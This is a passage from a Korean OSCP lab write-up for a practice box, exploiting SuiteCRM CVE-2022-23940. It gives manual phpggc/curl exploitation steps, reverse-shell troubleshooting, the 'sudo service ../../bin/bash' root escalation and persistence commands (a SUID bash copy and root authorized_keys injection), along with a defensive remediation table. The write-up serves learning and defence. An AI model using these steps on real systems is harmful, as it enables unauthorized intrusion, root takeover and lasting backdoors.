> **`searchsploit`이 비면 "취약점 없음"이 아니라 "DB에 없음"으로 읽어라.** 이 한 줄 차이가 박스 하나를 살린다.

### ② 익스플로잇이 "행"에 걸렸다 — 실제 겪음, 가장 값진 함정

```
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```
여기서 스크립트가 굳고 결국 타임아웃됐다. **완전한 실패로 보이는 화면**이다.

전형적인 오판 흐름은 이렇다: 스크립트 실패 → 페이로드 문법 의심 → base64 다시 만들기 → 다른 PoC 저장소 탐색 → 익스플로잇 소스 수정… **여기서 30분이 날아간다.**

실제 원인은 **성공이었다**:
- 역직렬화가 `Save` POST를 **처리하는 도중 인라인으로 발화**한다
- `system()`이 리버스셸을 띄우고, 그 프로세스가 **HTTP 요청 스레드를 붙잡는다**
- 그래서 **HTTP 응답이 영영 반환되지 않는다** → 스크립트가 대기 → 타임아웃
- 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없었다

> [!danger] 원격 코드 실행에서 "응답 없음"은 성공의 신호일 수 있다
> **셸을 띄우는 페이로드는 요청을 반환시키지 않는 것이 오히려 정상**이다.
> **규칙: 익스플로잇을 던진 직후 확인 순서는 ① 리스너 → ② 스크립트 출력이다.** 순서를 거꾸로 하면 성공을 실패로 오독한다.
> 응답을 받으면서 셸도 받고 싶으면 페이로드를 백그라운드로 분리한다 — `... | bash &` 또는 `nohup ... &`. [[Hawat]]에서 `bash -c "..." &`를 쓴 이유가 정확히 이것이다.
>
> 누적 패턴: **"응답이 성공을 뜻하지 않는다"** — [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]]

### ③ 인스톨러 잔존물이라는 함정 — 실제 겪음

`/install.log`가 **51KB짜리 설치 로그 전문**을 그대로 뱉는다. **"여기가 길이다"라고 외치는 모양**이다.

실제로는:

| 조사한 것 | 결과 | 근거 |
|---|---|---|
| `/install.log` (51KB 전량 확인) | 설치일 2023-08-24, **DB 드라이버·XML 파서 부재 ERROR** 와 설치 진행 로그뿐. **평문 자격증명 없음** | ✅ 실측 (`~/PG/Crane/install.log` 51295바이트) |
| `/install.php` | `installer_locked => true` — **재설치 불가** | `[가정 — 산출물 미보존]` |
| `/config.php`, `/config_override.php` | 0바이트. **PHP가 정상 파싱함, 유출 없음** | `[가정 — 산출물 미보존]` |

**설치 로그 노출은 실제 침투 테스트에서는 보고 가치가 있는 정보 노출이지만, 이 박스에서는 피벗할 대상이 아니었다.**

> [!danger] 정정 — 원래 여기 "디렉터리 리스팅"과 "내부 IP"가 적혀 있었다
> 원문: *"디렉터리 리스팅이 켜진 `/install/`, 내부 IP가 박힌 `status.json`"* / *"`/install/status.json` | 내부 IP `172.16.201.78` 하나. **접근 불가, 활용처 없음**"*
> **둘 다 산출물이 반박한다** — `ferox.log`에 `/install` 히트 0건, `install.log` 전수 grep에 `172.16.*` 0건. (1장 열거 절의 "반증됨" 표 참조)
> **이 항목이 시행착오 장에 있었다는 것이 특히 위험했다.** "실제 겪음"이라고 라벨링된 서술은 검증 없이 통과하기 쉽다. **라벨이 사실을 만들지 않는다.**

> [!warning] "열려 보이는 것"과 "길"은 다르다
> 인스톨러 잔존물·설치 로그·디렉터리 리스팅·내부 IP 누출은 **정보 노출 보고서 항목**이지 반드시 익스플로잇 경로는 아니다(이 박스에서 실제로 확인된 것은 `install.log` 하나다).
> **손절 기준을 미리 정해라** — 인스톨러 계열은 `installer_locked`(SuiteCRM/SugarCRM)·`installed.lock`(Nextcloud)·`CONFIG_FILE 존재 여부`(WordPress) 한 번만 확인하고, 잠겨 있으면 **5분 안에 접는다.**
> 이 박스에서는 접는 판단이 옳았다. 정답은 이미 손에 있던 **버전 정보**였다.

### ④ `/home`이 비어 있어 user 플래그를 못 찾을 뻔했다 — 실제 겪음

`ls -la /home/` 결과가 `.`과 `..` 둘뿐이었다. **일반 사용자 계정이 아예 없다.**

"user 플래그를 얻으려면 먼저 어떤 사용자로 수평 이동해야 한다"고 가정하면 `/etc/passwd`를 뒤지고 자격증명을 찾느라 시간을 태운다. 실제로는 **`www-data` 그대로 읽을 수 있는 위치**에 있었다:

```
/var/www/local.txt
```

> [!tip] 플래그는 파일명으로 찾는다, 위치를 추측하지 않는다
> ```bash
> find / -name local.txt 2>/dev/null
> find / -name proof.txt 2>/dev/null
> find / -xdev \( -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
> ```
> `-xdev`는 **다른 파일시스템으로 넘어가지 않게** 한다 — `/proc`·`/sys`·NFS 마운트를 훑느라 느려지는 것을 막는다.
> **"user 플래그가 없다 = 아직 수평 이동이 남았다"는 가정이 틀릴 수 있다.** 서비스 계정만 있는 구성에서는 서비스 홈에 놓인다.

---

### ⑤ 이 유형에서 흔히 막히는 지점 — 리버스셸이 안 붙는다

*(이 박스에서는 4444로 한 번에 붙었다. 아래는 같은 유형을 다시 만났을 때의 점검 순서다.)*

| 의심 순서 | 확인 방법 |
|---|---|
| 1. **`sh` vs `bash`** | `system()`은 `/bin/sh -c`로 실행된다. 데비안의 `sh`는 dash다. 증상으로 구분하라 — **`Syntax error: Bad fd number`** 면 `>&`를 파싱하지 못한 것이고, **`cannot create /dev/tcp/...: Directory nonexistent`** 면 `/dev/tcp` 가상 장치가 없는 것이다(2-3 참조). 어느 쪽이든 답은 하나, 반드시 `\| bash`로 넘긴다 |
| 2. **아웃바운드 포트 차단** | 4444가 막혔으면 **443·80·53**을 시도. 1024 미만 리스너는 `sudo` 필요 ([[Hawat]]에서 실제로 이 함정) |
| 3. **인용 중첩으로 페이로드 파손** | base64 래핑 또는 hex 리터럴로 회피 |
| 4. **IP/포트 오타** | 리스너 IP는 `ip a`의 **VPN 인터페이스(tun0)** 주소여야 한다. 랜 주소를 넣으면 영영 안 온다 |
| 5. **셸은 붙었는데 즉시 끊긴다** | `bash -i` 누락(비대화형이라 즉시 종료) 또는 `0>&1` 누락(stdin 미연결) |

**최소 확인법**: 리버스셸 대신 `curl http://<내IP>/ping` 또는 `ping -c1 <내IP>`를 먼저 실행시켜 **아웃바운드가 나가는지**만 본다. 페이로드 문제와 네트워크 문제를 분리하는 가장 빠른 방법이다.

### ⑥ 이 유형에서 흔히 막히는 지점 — 역직렬화 체인이 조용히 죽는다

*(이 박스에서는 `Monolog/RCE2`가 한 번에 통했다.)*

가젯 체인은 **터지거나, 아무 일도 안 일어나거나** 둘 중 하나다. 에러 메시지가 없는 것이 특징이라 디버깅이 어렵다. 원인 후보:

| 원인 | 대응 |
|---|---|
| 라이브러리 **버전 불일치** — 체인이 특정 버전의 클래스 구조를 전제한다 | `phpggc -l <라이브러리>`로 **RCE1/RCE2/RCE3…** 를 순서대로 전부 시도한다 |
| 대상 라이브러리가 **번들되지 않음** | `vendor/composer/installed.json`을 읽을 수 있으면 확인. 못 읽으면 Monolog → Guzzle → Symfony 순으로 시도 |
| `__destruct`가 **예외로 중단** | 다른 체인으로 교체 |
| 페이로드가 **길이 필드 불일치**로 파싱 실패 | 직렬화 문자열을 손으로 고쳤다면 `s:<길이>` 값을 반드시 다시 계산. **한 글자만 틀려도 통째로 무시된다** |

**진단 요령**: RCE 대신 **`sleep 10`을 먼저 던진다.** 응답이 10초 늦으면 체인이 살아 있는 것이고, 그 다음에 리버스셸로 바꾼다. **셸이 안 붙는 것이 체인 문제인지 네트워크 문제인지**를 분리해준다.

### ⑦ 이 유형에서 흔히 막히는 지점 — `sudo -l`이 비밀번호를 요구한다

`www-data`는 비밀번호를 모르는 계정이다. `sudo -l`이 암호를 물으면 **그 자리에서 막힌다.**

이 박스는 `NOPASSWD`라 통과했지만, 물어보는 경우의 대안:
- `sudo -n -l` — 비대화형 확인. 프롬프트 없이 즉시 실패해 **시간을 안 태운다**
- `/etc/sudoers`·`/etc/sudoers.d/*`를 **읽을 수 있는지** 확인 (가끔 world-readable이다)
- SUID(`find / -perm -4000`) · capabilities(`getcap -r /`) · 크론 · 쓰기 가능한 서비스 파일로 **경로를 갈아탄다**

### ⑧ 이 유형에서 흔히 막히는 지점 — 셸을 잡았는데 명령이 안 먹는다

*(이 박스는 `python3 -c "import pty..."` 한 번에 정상화됐다.)*

리버스셸은 붙었는데 **`sudo`가 `no tty present`를 뱉거나, Ctrl+C가 셸 자체를 죽이거나, `su`/`ssh`가 비밀번호를 못 받는** 상황이 이 유형의 다음 관문이다. 원인은 전부 하나 — **TTY가 없다.**

| 증상 | 원인 | 대응 |
|---|---|---|
| `sudo: no tty present and no askpass program specified` | TTY 부재 | `pty.spawn` 또는 `script -qc /bin/bash /dev/null` |
| Ctrl+C가 **리버스셸 전체를 종료** | 시그널이 nc로 간다 | `stty raw -echo` 후 `fg` |
| `clear`·`vim`·`less`가 깨짐 | `TERM` 미설정 | `export TERM=xterm` |
| 탭 완성 안 됨 | raw 모드 미적용 | Ctrl+Z → `stty raw -echo; fg` → Enter 두 번 |
| `python3: command not found` | 최소 설치 | `script -qc /bin/bash /dev/null` · `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'` ([[Hawat]]에서 실제 사례) |

**이 박스에서 `sudo`가 통한 이유**는 `pty.spawn`으로 TTY를 이미 확보한 뒤에 `sudo -l`을 쳤기 때문이다. **순서를 바꿔 raw 셸에서 바로 `sudo -l`을 쳤다면 `no tty present`로 막혀 "sudo 권한이 없다"고 오판**했을 것이다.

> [!danger] `sudo -l`이 실패했다고 sudo 권한이 없는 것이 아니다
> 권한 문제와 TTY 문제는 **전혀 다른 실패**인데 겉보기가 비슷하다.
> **규칙: TTY 업그레이드를 먼저 하고 열거를 시작한다.** 순서가 뒤바뀌면 결정적인 단서를 놓친다.

### ⑨ 이 유형에서 흔히 막히는 지점 — 권한상승 셸이 즉시 죽는다

*(이 박스에서는 `sudo /usr/sbin/service ../../../../../bin/bash`가 그대로 대화형 root 셸을 줬다.)*

GTFOBins 페이로드가 root 셸을 띄웠는데 **곧바로 종료되거나 입력을 못 받는** 경우가 있다. 원인과 대응:

| 원인 | 대응 |
|---|---|
| 부모가 **비대화형 컨텍스트** — 웹셸이나 파이프 안에서 실행 | 반드시 **TTY가 있는 리버스셸 안에서** 실행한다 |
| 띄운 셸이 **stdin을 상속받지 못함** | 셸을 잡는 대신 **지속성을 심는다**: `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` → `/tmp/rootbash -p` |
| 페이로드가 인자를 추가로 받아 오작동 | 인자 없이 되는 형태를 고른다. `service`는 **서비스명 하나만** 넘기면 된다 |

> [!tip] root를 잡으면 **먼저 되돌아올 길부터 만든다**
> ```bash
> cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash    # SUID 백도어 (랩 한정)
> # 또는 공개키 주입
> mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
> ```
> 리버스셸은 언제든 끊긴다. **root 셸이 끊겨서 익스플로잇 전체를 처음부터 다시 도는 것**이 시험에서 가장 아까운 시간 낭비다.
> ⚠️ 실제 침투 테스트에서는 이런 흔적을 **반드시 보고서에 기록하고 회수**한다.

### ⑩ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 적정 시간 | 손절 신호 |
|---|---|---|
| nmap `-p-` | ~1분 | `--min-rate` 없이 10분을 넘기면 즉시 중단하고 다시 건다 |
| 버전 확정 | ~5분 | 비인증 엔드포인트·README·헤더·풋터 중 **2개**로 교차되면 끝 |
| `/install.log` 등 인스톨러 잔존물 조사 | **5분 상한** | 로그에 자격증명이 없고 `installer_locked`가 걸린 것을 확인하면 즉시 접는다 |
| feroxbuster 1085행 정독 | **하지 말 것** | 제품이 특정된 뒤에는 브루트포스 결과의 가치가 급락한다 |
| CVE 검색 → PoC 확보 | ~10분 | searchsploit이 비면 **즉시** CVE 검색으로 전환 |
| 익스플로잇 발사 후 대기 | **30초** | 그 안에 리스너를 확인한다. 스크립트를 쳐다보며 기다리지 않는다 |
| `sudo -l` → GTFOBins | ~2분 | 항목이 있으면 끝. 없으면 SUID/cap/cron으로 즉시 이동 |

**이 박스의 이론상 최소 시간은 15분 안쪽**이다. 실제로 시간이 새는 곳은 ①(searchsploit 오독)과 ②(행 착시) 둘뿐이고, 둘 다 **판단 착오**이지 기술 부족이 아니다.

---

## 7. OSCP 시험 관점

1. **버전 특정 → CVE 검색**이 전부인 박스다. `searchsploit`만 믿고 "7.12.3용 익스가 없다"고 접으면 끝난다. 비인증 REST(`get_server_info`)로 버전을 뽑고, CVE 번호로 GitHub PoC를 찾는 흐름을 몸에 익힐 것.
2. **기본 자격증명은 항상 먼저 시도한다.** `admin:admin` 한 번으로 인증 전제조건이 해결됐다. **post-auth CVE는 자격증명이 선행 조건**이므로 순서를 거꾸로 하면 "CVE가 안 먹는다"고 오판한다.
3. **익스플로잇이 "행"에 걸린 것처럼 보여도 리스너를 먼저 확인**한다. 역직렬화·인라인 RCE 계열에서 흔한 착시다. **확인 순서는 ① 리스너 ② 스크립트 출력.**
4. **`sudo -l`은 셸 잡자마자 무조건.** `service`, `tar`, `ruby`, `docker` 같은 GTFOBins 항목이 걸리면 그 즉시 끝난다. `env_reset`+`secure_path`가 보이면 환경변수 트릭을 접고 바로 GTFOBins로 간다.
5. **공개 PoC 스크립트(`exploit.py`)는 시험에서 허용된다.** OSCP 금지 정의는 *"automatically **discovering and exploiting**"* — **스스로 취약점을 찾는** 도구(`db_autopwn`·`browser_autopwn`·SQLmap·SQLninja)를 겨냥한다. 특정 CVE 하나를 겨냥한 PoC는 **네가 열거해서 정해준 뒤에야 동작**하므로 해당되지 않는다. 애초에 exploit-db 사용을 전제로 만든 시험이다.
   - **판단 기준은 "금지냐"가 아니라 "스크립트가 죽으면 이어갈 수 있느냐"다.** 버전이 조금만 달라도 공개 PoC는 조용히 실패한다.
   - **수동 대안** (필드는 `exploit.py` 소스에서 그대로 환원): ① `curl -c cookies.txt`로 로그인 → ② `phpggc Monolog/RCE2 system '<cmd>' -b` → ③ `curl -b cookies.txt -X POST .../index.php -H 'Referer: http://TARGET' --data-urlencode 'module=AOR_Scheduled_Reports' --data-urlencode 'action=Save' --data-urlencode 'name=test' --data-urlencode 'status=active' --data-urlencode 'schedule_type=monthly' --data-urlencode 'email_recipients=<페이로드>'` → ④ 리스너 확인
   - ⚠️ **`name`·`status`·`schedule_type`·`Referer`를 빼면 레코드 생성이 실패한다.** 3-2의 수동 절차가 원래 3개 필드만 적어놨던 것을 정정했다.
   - **PoC를 쓰더라도 반드시 소스를 열어 "어떤 HTTP 요청을 보내는가"를 읽어라.** 그게 곧 수동 절차이고, 스크립트가 죽었을 때의 유일한 디버깅 수단이다.
6. **PHP 역직렬화의 신호를 외워라.** `unserialize(` · `base64_decode` 를 거친 사용자 입력 · `O:8:"..."` 로 시작하는 쿠키/파라미터 값 · `phpggc` 대상 라이브러리(`vendor/monolog`, `vendor/guzzlehttp`)의 존재. **하나라도 보이면 POP 체인을 의심**한다. 다른 언어 대응물: Java `readObject`(ysoserial) · Python `pickle.loads` · Ruby `Marshal.load` · .NET `BinaryFormatter`.
7. **`system()`은 `/bin/sh -c`로 실행된다.** 데비안의 `sh`는 dash이고, dash는 **두 층에서** 리버스셸을 죽인다 — ① `>&`를 fd 복제로만 해석해 `Syntax error: Bad fd number`, ② `>` 하나로 바꿔도 `/dev/tcp` 가상 장치가 없어 `cannot create /dev/tcp/...: Directory nonexistent`. 그래서 리버스셸은 **반드시 `| bash`** 로 넘긴다. 안 붙을 때 가장 먼저 의심할 항목.
8. **base64 래핑은 인용 중첩의 표준 해법이다.** `echo -n '<cmd>' | base64 -w0` → `echo <b64> | base64 -d | bash`. **`-n`과 `-w0`을 빼먹으면 조용히 실패**한다. 같은 목적의 대안은 hex 리터럴([[Hawat]] · [[Squid]]).
9. **`sudo` 항목이 인자를 경로에 이어붙이면 전부 탈출구다.** `/etc/init.d/` + `../../../../../bin/bash` = `/bin/bash`. `..`는 **넉넉히 넣으면 되고 개수를 셀 필요가 없다** — 루트에서 흡수된다. 트래버설 페이로드에도 같은 성질을 쓴다.
10. **플래그는 위치를 추측하지 말고 이름으로 찾는다.** `find / -name local.txt 2>/dev/null`. `/home`이 비었다고 "수평 이동이 남았다"고 단정하지 않는다 — 서비스 계정만 있는 구성에서는 `/var/www`에 놓인다.
11. **200 응답이 성공이 아니다.** `"Not A Valid Entry Point"`(23바이트)가 200으로 나온다. **디렉터리 브루트포스 결과는 상태코드가 아니라 길이로 1차 분류**한다.
12. **인스톨러 잔존물(`/install.log` 51KB)은 함정**이었다 — 설치 로그 전문이 그대로 서빙되지만 안에 있는 것은 DB 드라이버 부재 에러뿐, **자격증명은 없다.** 열려 보인다고 다 길은 아니다. **5분 상한을 걸고 접어라.**
    - ⚠️ 이 항목은 원래 *"`/install/` 디렉터리 리스팅과 내부 IP 누출(`172.16.201.78`)"* 로 적혀 있었으나 **산출물이 반박했다**(`ferox.log`·`install.log` 전수 확인). 1장의 "반증됨" 표 참조. **정찰 산출물을 다시 열지 않고 기억으로 쓴 서술이 어떻게 굳는지**의 사례로 남겨둔다.
13. **DB 자격증명을 얻어도 원격에서 못 쓸 수 있다.** nmap의 `MySQL (unauthorized)`가 그 예고편이다. 호스트 제한이 걸렸으면 **SSH 포트포워딩이나 이미 확보한 웹셸을 경유**한다. 그리고 얻은 비밀번호는 **다른 서비스에 재사용**부터 시도한다.

> [!tip] 시험 반사 체크 — 이 박스로 답이 채워지는가
> - [ ] **셸을 잡자마자 칠 명령 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`
> - [ ] **SuiteCRM/SugarCRM을 다시 만나면 가장 먼저**: `curl .../service/v4_1/rest.php?method=get_server_info...` → 버전 확정, 그리고 `admin:admin`
> - [ ] **자동 도구 없이 같은 결과**: phpggc로 페이로드 생성 + curl로 `AOR_Scheduled_Reports` Save POST
> - [ ] **이 단계에서 실패했다면 다음 후보**: SuiteCRM 다른 CVE(7.12.x 계열 SQLi/XSS) → `/ical_server.php`(WebDAV, 401) → SSH 자격증명 재사용
> - [ ] **리버스셸이 안 붙으면**: `sh` vs `bash` → 아웃바운드 포트 → 인용 파손 → tun0 IP 오타

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **`is_array()` 타입 검사를 우회해 DB에 원문이 저장됨** (CVE-2022-23940의 실제 결함) | `save()`가 `is_array()`일 때만 값을 정규화하고 **아닐 때는 그대로 통과**시킨 것이 근인이다. **검사에 걸리지 않은 입력을 "안전하다"고 취급하지 말고 `else` 분기에서 거부**하라. 화이트리스트 방식(예상 타입이 아니면 400)으로 뒤집는다 |
| **`unserialize()`에 신뢰 경계 밖 데이터가 도달** (최종 sink) | **사용자 데이터에 `unserialize()`를 쓰지 않는다.** `json_decode()`처럼 객체를 되살리지 않는 포맷으로 교체. 불가피하면 `unserialize($d, ['allowed_classes' => false])`로 클래스 복원을 차단하고, 데이터에 **HMAC 서명**을 붙여 위변조를 검출 |
| SuiteCRM **7.12.3 미패치** | **7.12.5 이상으로 업그레이드.** 이 CVE는 벤더가 이미 고쳤다 — 패치 적용만으로 전체 경로가 사라진다 |
| 관리자 **기본 자격증명 `admin:admin`** | 설치 시 강제 변경 + 관리자 계정에 **MFA**. 로그인 실패 임계값과 계정 잠금. ⚠️ 단 **이것만으로는 부족하다** — 이 CVE는 관리자가 아니라 **예약 보고서 생성 권한이 있는 임의 계정**이면 발화한다. 저권한 계정 하나가 새도 경로가 살아 있다 |
| **`/install.log`(51KB) 웹루트 노출** | 설치 완료 후 인스톨러 산출물(`install.log`·`install/` 등)을 **삭제하거나 웹루트 밖으로** 옮긴다. 설치 로그에는 경로·버전·구성요소 목록이 남고, 제품·설정에 따라 **자격증명이 섞이는 경우도 있다**. 웹서버 레벨에서 `.log` 확장자를 거부 규칙으로 차단 |
| `PHPSESSID`에 **HttpOnly 미설정** | `session.cookie_httponly=1` · `session.cookie_secure=1` · `SameSite=Lax`. XSS가 곧 세션 탈취가 되는 것을 막는다 |
| **`www-data`에 `sudo /usr/sbin/service` (NOPASSWD, ALL)** | **웹 서비스 계정에 sudo를 주지 않는다.** 불가피하면 인자를 고정한 별도 래퍼 스크립트를 지정하고(`/usr/local/sbin/restart-app`), 래퍼가 인자를 받지 않도록 한다. **`service` 같은 범용 실행기는 인자 제한이 불가능**하다 |
| MySQL `root` / **빈 패스워드** | 애플리케이션 전용 계정을 별도 생성하고 필요한 DB에만 최소 권한. root 비밀번호 설정 및 `FILE` 권한 회수 |
| DB 자격증명 **평문 저장**(`config.php`) | 파일 권한을 웹서버 사용자 읽기 전용으로 제한. 환경변수/시크릿 관리자 사용 |
| 심층 방어 | **아웃바운드 egress 필터링** — 서버가 임의 포트로 나가지 못하면 리버스셸이 붙지 않는다. RCE가 나도 피해가 줄어든다 |

---

## 9. 참고 자료

- **CVE-2022-23940** — SuiteCRM `AOR_Scheduled_Reports` 인증 후 PHP 객체 역직렬화 RCE (7.12.5에서 패치)
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-23940
- 사용한 PoC: https://github.com/manuelz120/CVE-2022-23940
- **phpggc** — PHP 가젯 체인 생성기: https://github.com/ambionics/phpggc
  - `phpggc -l monolog` / `phpggc Monolog/RCE2 system '<cmd>' -b`
- **GTFOBins `service`**: https://gtfobins.github.io/gtfobins/service/
- PHP 매직 메서드 레퍼런스: https://www.php.net/manual/en/language.oop5.magic.php
- `unserialize()` 안전 옵션: https://www.php.net/manual/en/function.unserialize.php (`allowed_classes`)
- OWASP — Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- SuiteCRM REST v4_1 `get_server_info` (비인증 버전 노출) — 제품 문서

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `AOR_Scheduled_Reports`에 생성된 악성 예약 보고서 레코드 | 남아 있음 — 랩 Stop/Revert로 소멸 |
| SuiteCRM `admin` 세션(`PHPSESSID`) | 만료 |
| 업로드한 파일 없음 (웹셸 미사용, 인메모리 RCE) | — |

획득 자격증명: SuiteCRM `admin` / `admin`, MySQL `root` / (빈 문자열, **localhost 전용**).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[01. Pentest Foundations]] — Crane 항목 (동일 경로 요약)
- [[Hawat]] — 인용 중첩 회피(hex 리터럴) · 아웃바운드 포트 제약 · "응답이 성공을 뜻하지 않는다"
- [[RubyDome]] · [[Astronaut]] · [[Exghost]] — **"응답이 성공을 뜻하지 않는다"** 패턴 누적
- [[Hub]] · [[Levram]] — **"버전 판정은 독립 근거 2개"** 패턴 누적
- [[Levram]] · [[Astronaut]] · [[Twiggy]] — 같은 Foundations 컬렉션
